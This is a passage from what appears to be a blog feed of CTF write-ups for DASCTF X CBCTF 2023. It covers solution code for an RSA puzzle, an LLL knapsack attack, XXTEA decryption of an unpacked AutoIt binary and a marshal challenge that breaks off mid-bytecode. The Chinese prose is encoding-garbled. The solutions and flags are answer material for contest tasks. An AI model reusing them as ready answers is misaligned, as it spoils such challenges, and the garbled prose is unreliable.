<p>æ²¡æœ‰äº¤äº’ç¯å¢ƒ<br>æ³¨æ„åˆ°é€‰1åçš„ç¬¬äºŒä¸‰è½®ä¼šç»™æˆ‘ä»¬6ä¸ªLCGä¸­è¿ç»­çš„æ•°<br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ¢å¤LCGçš„ä¸‰ä¸ªç³»æ•° ä»è€Œé¢„æµ‹æ¥ä¸‹æ¥çš„å€¼<br>æ³¨æ„åˆ°è¿™é‡Œå®ƒè¦æˆ‘ä»¬ç»™ç¬¬15ä¸ªå­—ç¬¦(card[x][15])<br>è€Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“æ˜¯å¤šå°‘ ä½†æ˜¯å¯ä»¥æšä¸¾(0-9 AKQJ)<br>åªè¦æœ€ååˆ†æ•°è¾¾åˆ°50åˆ†å³å¯</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>DASCTF X CBCTF 2023 10</title>
    <url>/2023/12/03/DASCTF-X-CBCTF-2023-10/</url>
    <content><![CDATA[<p>èƒ½åŠ›æœ‰é™ åªèƒ½å¤ç°èƒ½åšçš„ä¸€äº›é¢˜ å…¶ä»–çš„æ…¢æ…¢è¡¥</p>
<span id="more"></span>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><p>chall.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">f</span>):</span><br><span class="line">    random_chars = <span class="built_in">bytes</span>([random.randint(<span class="number">0</span>, <span class="number">255</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)])</span><br><span class="line">    f = f + random_chars</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_p</span>(<span class="params">p</span>):</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    </span><br><span class="line">    P = p</span><br><span class="line">    n1 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;enc.txt&#x27;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> jacobi(<span class="number">2</span>,n1) == <span class="number">1</span>:</span><br><span class="line">            n1 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">while</span> P:</span><br><span class="line">            pad = random.randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">2023</span>)**<span class="number">2</span> </span><br><span class="line">            message = pad &lt;&lt; <span class="number">1</span> + P % <span class="number">2</span></span><br><span class="line">            cipher = <span class="built_in">pow</span>(message, e, n1)</span><br><span class="line">            f.write(<span class="built_in">str</span>(cipher)+<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            P //= <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n1 = &quot;</span>+ <span class="built_in">str</span>(n1) )    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_q</span>(<span class="params">q</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">q, n</span>):</span><br><span class="line">        e = random.randint(<span class="number">1000</span>,<span class="number">2000</span>)</span><br><span class="line">        noise = random.randint(<span class="number">0</span>, n - <span class="number">1</span>)</span><br><span class="line">        c = <span class="built_in">pow</span>(q+noise,e,n)</span><br><span class="line">        <span class="keyword">return</span> e, noise,c </span><br><span class="line">    </span><br><span class="line">    n2 = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">    e1, noise1, c1 = encrypt(q, n2)</span><br><span class="line">    e2, noise2, c2 = encrypt(q, n2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n2 = &quot;</span>+ <span class="built_in">str</span>(n2) ) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;(e1, noise1, c1) =&#x27;</span>, (e1,noise1,c1))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;(e2, noise2, c2) =&#x27;</span>, (e2,noise2,c2))</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">guess_p(p)</span><br><span class="line">guess_q(q)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">flag = padding(flag)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n1 = 65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309</span></span><br><span class="line"><span class="string">n2 = 103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393</span></span><br><span class="line"><span class="string">(e1, noise1, c1) = (1743, 44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776, 65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983)</span></span><br><span class="line"><span class="string">(e2, noise2, c2) = (1325, 35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683, 50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714)</span></span><br><span class="line"><span class="string">c = 124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæ¯”èµ›çš„æ—¶å€™å¤§æ¦‚æ˜ç™½è¿™é‡Œçš„Jacobiçš„ç„æœº ä½†æ˜¯åªæ˜¯å‚¨å¤‡å®Œå…¨ä¸å¤Ÿ ççŒœçš„å‡ ä¸ªç»“è®ºä¹Ÿæ±‚ä¸å‡ºp<br>æ±‚qçš„éƒ¨åˆ†å½“æ—¶ä¹Ÿä»¥ä¸ºeä¸åŒä¸èƒ½sageè·‘(è™½è¯´å†™äº†ä¸€ä¸ªcopperä½†å¥½åƒå†™å‡äº†ã€‚ã€‚ã€‚ è¦å†è®¤çœŸå¼„æ‡‚copperçš„åŸç†)<br>å…ˆè·‘q:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n2))</span><br><span class="line">    g1 = (x+noise1)^e1-c1</span><br><span class="line">    g2 = (x+noise2)^e2-c2</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">g1,g2</span>):</span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2,g1%g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1,g2)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(attack())</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åæ±‚p<br>é¦–å…ˆäº†è§£kroneckerç¬¦å·<br><img src="https://s2.loli.net/2023/12/03/VSfdpxDN2AtmHkJ.png" alt="_KE8ATP818UNXM_L6_9A_P2.png"><br>ç”±äºJacobiåªæ˜¯å°†å‹’è®©å¾·çš„å¥‡ç´ æ•°æ¨å¹¿åˆ°äº†å¥‡æ•°<br>è€Œkroneckerç¬¦å·æ˜¯æ¨å¹¿åˆ°äº†ä¸€èˆ¬çš„æ•´æ•° æ›´å…·æ™®é€‚æ„ä¹‰</p>
<p>ä¸¤ç§æƒ…å†µ</p>
<ul>
<li><code>(2x^2)^e</code> </li>
<li><code>(2x^2+1)^e</code></li>
</ul>
<p><img src="https://s2.loli.net/2023/12/03/m9Br3gGlnudUvAO.png" alt="AHYCN6UYNIUKOMT____HZPE.png"><br><font color=red size=5>ä¸è¦å¿˜äº†æ¬§æ‹‰å‡†åˆ™ï¼ï¼ï¼äºŒæ¬¡å‰©ä½™æœ€åˆçš„åˆ¤æ–­æ–¹å¼ï¼ï¼ï¼</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    i = <span class="built_in">int</span>(i)</span><br><span class="line">    <span class="keyword">if</span>(kronecker(i,n1)==<span class="number">1</span>):</span><br><span class="line">        p = <span class="string">&#x27;1&#x27;</span>+p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = <span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line"><span class="comment"># print(int(p,2))</span></span><br></pre></td></tr></table></figure>
<p>æˆ–è€…è¿™ç§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(kronecker(i,n1)==-<span class="number">1</span>):</span><br><span class="line">        p = <span class="string">&#x27;0&#x27;</span>+p</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = <span class="string">&#x27;1&#x27;</span>+p</span><br></pre></td></tr></table></figure>
<p>æœ€åçš„flag<br><img src="https://s2.loli.net/2023/12/03/4bwU5vxHVqXTBIs.png" alt="6R1Y1YM9VKF78ACQ__@FXF0.png"></p>
<h2 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h2><p>ç²—æµ…å­¦äº†ä¸‹æ ¼å¯†ç  çœ‹äº†çœ‹èƒŒåŒ…å¯†ç LLLç ´è§£çš„æœ¬è´¨<br>è¿˜æ˜¯è¦å­¦ä¼šè‡ªå·±é€ æ ¼å­<br>è¿™é¢˜è·Ÿæ™®é€šçš„èƒŒåŒ…ä¸åŒåœ¨äº æ¯6ä¸ªä¸­å¿…æœ‰3ä¸ª1<br>æ‰€ä»¥è¦å†åŠ ä¸Šä¸€åˆ—çš„çº¦æŸ å³ Î£xi &#x3D; 24<br>å€Ÿå¤§ä½¬çš„å›¾<br><img src="https://s2.loli.net/2023/12/03/7WanPqKwBNDe2gX.png" alt="Y@V1GI@_GOC3F_LV8V_LY_H.png"><br>æœ€ååˆ¤æ–­å°±æ˜¯åœ¨å¸¸è§„çš„-Sé‚£åˆ—ä¸º0ååŠ ä¸Šæœ€åä¸€åˆ—ä¸º0<br>solution.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">65651991706497</span>, <span class="number">247831871690373</span>, <span class="number">120247087605020</span>, <span class="number">236854536567393</span>, <span class="number">38795708921144</span>, <span class="number">256334857906663</span>, <span class="number">120089773523233</span>, <span class="number">165349388120302</span>, <span class="number">123968326805899</span>, <span class="number">79638234559694</span>, <span class="number">259559389823590</span>, <span class="number">256776519514651</span>, <span class="number">107733244474073</span>, <span class="number">216508566448440</span>, <span class="number">39327578905012</span>, <span class="number">118682486932022</span>, <span class="number">263357223061004</span>, <span class="number">132872609024098</span>, <span class="number">44605761726563</span>, <span class="number">24908360451602</span>, <span class="number">237906955893793</span>, <span class="number">204469770496199</span>, <span class="number">7055254513808</span>, <span class="number">221802659519968</span>, <span class="number">169686619990988</span>, <span class="number">23128789035141</span>, <span class="number">208847144870760</span>, <span class="number">272339624469135</span>, <span class="number">269511404473473</span>, <span class="number">112830627321371</span>, <span class="number">73203551744776</span>, <span class="number">42843503010671</span>, <span class="number">118193938825623</span>, <span class="number">49625220390324</span>, <span class="number">230439888723036</span>, <span class="number">241486656550572</span>, <span class="number">107149406378865</span>, <span class="number">233503862264755</span>, <span class="number">269502011971514</span>, <span class="number">181805192674559</span>, <span class="number">152612003195556</span>, <span class="number">184127512098087</span>, <span class="number">165959151027513</span>, <span class="number">188723045133473</span>, <span class="number">241615906682300</span>, <span class="number">216101484550038</span>, <span class="number">81190147709444</span>, <span class="number">124498742419309</span>]</span><br><span class="line">re = <span class="number">4051501228761632</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(a)</span><br><span class="line">K = <span class="number">2</span>^<span class="number">10</span></span><br><span class="line">M = Matrix(ZZ,n+<span class="number">1</span>,n+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    M[i,i] = <span class="number">1</span></span><br><span class="line">    M[i,n] = K*a[i]</span><br><span class="line">    M[i,n+<span class="number">1</span>] = K*<span class="number">1</span></span><br><span class="line">M[n,n] = -K*re</span><br><span class="line">M[n,n+<span class="number">1</span>] = -<span class="number">24</span>*K</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> M.LLL():</span><br><span class="line">    <span class="keyword">if</span>(line[-<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> line[-<span class="number">2</span>]==<span class="number">0</span>):</span><br><span class="line">        x = [<span class="built_in">abs</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> line[:-<span class="number">2</span>]]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(x).issubset([<span class="number">0</span>, <span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(x)</span><br><span class="line">            flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span>+sha256(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> x]).encode()).hexdigest()+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/03/YjdHfbD6wquvmnB.png" alt="image.png"></p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="auuuu3"><a href="#auuuu3" class="headerlink" title="auuuu3"></a>auuuu3</h2><p>ç»™çš„æ˜¯ä¸€ä¸ªautoitæ ¼å¼çš„exe<br>å¦‚æœç”¨IDAæŸ¥çœ‹ åŸºæœ¬ä¸Šæ˜¯åšä¸å‡ºæ¥çš„<br>ä¸‡å¹¸çš„æ˜¯æœ‰ä¸ªè„šæœ¬å¯ä»¥å¸®æˆ‘ä»¬extract<br><a href="https://github.com/nazywam/AutoIt-Ripper">https://github.com/nazywam/AutoIt-Ripper</a><br>ç„¶åè¿™ä¹ˆç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> autoit_ripper <span class="keyword">import</span> extract, AutoItVersion</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\æµè§ˆå™¨ä¸‹è½½\auuuu3.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file_content = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># EA05 for v3.00+, EA06 for v3.26+</span></span><br><span class="line"><span class="comment"># Omitting `version` or passing None will try both versions</span></span><br><span class="line">content_list = extract(data=file_content, version=AutoItVersion.EA06)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;D:\æµè§ˆå™¨ä¸‹è½½\auuuu3.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">        s = <span class="built_in">str</span>(content)</span><br><span class="line">        f.write(s)</span><br></pre></td></tr></table></figure>
<p>WPç”¨çš„exeæˆ‘æ²¡æ‰¾åˆ°â€¦ ä½†æ˜¯è¿™æ ·æå–å‡ºæ¥å¤§è‡´ä¹Ÿèƒ½çœ‹<br>å¾ˆå®¹æ˜“å®šä½åˆ°æœ€åä¸€éƒ¨åˆ†<br><img src="https://s2.loli.net/2023/12/03/GAH385FJgWbe4xw.png" alt="image-1.png"><br>è¿™é‡Œç›¸å½“äºloadäº†ä¸€ä¸ªdll åªæ˜¯æ˜¯ç”¨hexå†™çš„ æˆ‘ä»¬å°†è¿™æ®µopcodeå¯¼å…¥dllç”¨IDAæ¥åˆ†æ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">OPCODE = <span class="string">&quot;83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\æµè§ˆå™¨ä¸‹è½½\enc.dll&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(binascii.unhexlify(OPCODE))</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/12/03/o6lqvjngdYhQsIW.png" alt="ZZ_QD_HMMKFJ94TSU_~VHPT.png"><br>æ ‡å‡†çš„xxteaåŠ å¯†</p>
<p>æˆ‘ä»¬å·²çŸ¥ ciphertext<code>7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675</code></p>
<p>key<code>Wowww111auUu3</code><br>å°ç«¯åºè½¬ä¸€ä¸‹ è§£å¯†</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">10</span>]= &#123;<span class="number">0x1A181872</span>,<span class="number">0x4B9FF702</span>,<span class="number">0xFFE87357</span>,<span class="number">0x32E73FE8</span>,<span class="number">0x9F2596DF</span>,<span class="number">0xAB6AB8F2</span>,<span class="number">0xA1685494</span>,<span class="number">0x833DA832</span>,<span class="number">0x0E759DCF</span>,<span class="number">0x75866C31</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;<span class="number">0x77776f57</span>,<span class="number">0x31313177</span>,<span class="number">0x75557561</span>,<span class="number">0x33</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n= <span class="number">10</span>; </span><br><span class="line">    btea(v, -n, k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    	<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">3</span>;j++)</span><br><span class="line">    		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(v[i]&gt;&gt;(<span class="number">8</span>*j))&amp;<span class="number">0xff</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>flag : <strong>DASCTF{Oh1_autO1t_iS_so_Co0oL_aNd_Fun}</strong><br>å¯ä»¥çœ‹åˆ° è¿™é¢˜ä¸»è¦è€ƒçš„å…¶å®æ˜¯åˆç†åˆ©ç”¨å·¥å…·è¿›è¡Œåˆ†æ(æ‰¾åˆ°autoit-ripperåçš„åˆ†æå…¶å®å¹¶ä¸éš¾ <del>ä½†å¦‚æœåªä¼šIDAå°±Gäº†â€¦</del>)</p>
<h2 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a>marshal</h2><p>é¢˜ç›®ç»™çš„ä¸€ä¸ªåµŒå¥—marshalçš„py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\